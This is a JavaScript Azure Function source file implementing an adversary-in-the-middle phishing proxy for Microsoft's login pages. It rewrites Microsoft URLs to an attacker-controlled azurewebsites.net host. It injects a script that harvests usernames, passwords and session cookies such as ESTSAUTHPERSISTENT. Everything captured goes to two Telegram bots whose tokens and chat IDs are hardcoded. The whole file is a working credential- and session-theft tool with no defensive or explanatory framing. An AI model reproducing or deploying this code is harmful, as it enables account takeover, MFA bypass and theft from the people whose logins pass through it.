const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  const path = context.bindingData.path || '';
  
  // Handle special endpoints
  if (path === 'hijack-session') {
    const body = await req.text();
    await sendTelegram(`🍪 <b>SESSION COOKIES CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/plain' },
      body: 'OK'
    };
    return;
  }
  
  if (path === 'hijack-credentials') {
    const body = await req.text();
    await sendTelegram(`🔐 <b>CREDENTIALS CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/plain' },
      body: 'OK'
    };
    return;
  }
  
  // Proxy to Microsoft
  const targetUrl = `https://login.microsoftonline.com/${path}${req.query ? '?' + new URLSearchParams(req.query).toString() : ''}`;
  
  try {
    const headers = {};
    for (const [key, value] of Object.entries(req.headers)) {
      if (!key.startsWith('x-') && key !== 'host') {
        headers[key] = value;
      }
    }
    headers['Host'] = 'login.microsoftonline.com';
    
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined
    });
    
    let body;
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html')) {
      body = await response.text();
      
      // URL rewriting for seamless proxying
      body = body
        .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
        .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
        .replace(/https:\/\/account\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
        .replace(/logincdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy')
        .replace(/aadcdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy');
      
      // Inject client-side monitoring
      const injectionScript = `
<script>
// 🔥 SESSION HIJACKING MONITOR
(function() {
    const originalCookie = document.cookie;
    const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
    
    // Monitor cookie changes
    setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies !== originalCookie) {
            criticalCookies.forEach(cookieName => {
                const match = currentCookies.match(new RegExp(cookieName + '=([^;]+)'));
                if (match) {
                    fetch('/cookieproxy/hijack-session', {
                        method: 'POST',
                        body: \`🍪 \${cookieName}: \${match[1].substring(0, 100)}...\`
                    }).catch(() => {});
                }
            });
        }
    }, 1000);
    
    // Monitor form submissions
    document.addEventListener('submit', (e) => {
        const form = e.target;
        const formData = new FormData(form);
        let credentials = '';
        for (let [key, value] of formData.entries()) {
            if (key.toLowerCase().includes('user') || key.toLowerCase().includes('email') || key.toLowerCase().includes('login')) {
                credentials += \`📧 \${key}: \${value}\\n\`;
            }
            if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd')) {
                credentials += \`🔐 \${key}: \${value}\\n\`;
            }
        }
        if (credentials) {
            fetch('/cookieproxy/hijack-credentials', {
                method: 'POST',
                body: credentials
            }).catch(() => {});
        }
    });
})();
</script>`;
      
      body = body.replace('</head>', injectionScript + '</head>');
    } else {
      body = await response.arrayBuffer();
    }
    
    // Parse Set-Cookie headers for critical cookies
    const setCookieHeaders = response.headers.get('set-cookie');
    if (setCookieHeaders) {
      const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
      criticalCookies.forEach(cookieName => {
        if (setCookieHeaders.includes(cookieName)) {
          const match = setCookieHeaders.match(new RegExp(cookieName + '=([^;]+)'));
          if (match) {
            sendTelegram(`🚨 <b>CRITICAL COOKIE CAPTURED</b>\n🍪 ${cookieName}: ${match[1].substring(0, 100)}...\n📅 ${new Date().toISOString()}`);
          }
        }
      });
    }
    
    const responseHeaders = {};
    for (const [key, value] of response.headers) {
      if (key !== 'content-encoding' && key !== 'content-length') {
        responseHeaders[key] = value;
      }
    }
    
    context.res = {
      status: response.status,
      headers: responseHeaders,
      body: body
    };
    
  } catch (error) {
    await sendTelegram(`⚠️ <b>PROXY ERROR</b>\n🔥 Error: ${error.message}\n🔗 URL: ${targetUrl}`);
    context.res = {
      status: 500,
      body: `Proxy Error: ${error.message}`
    };
  }
};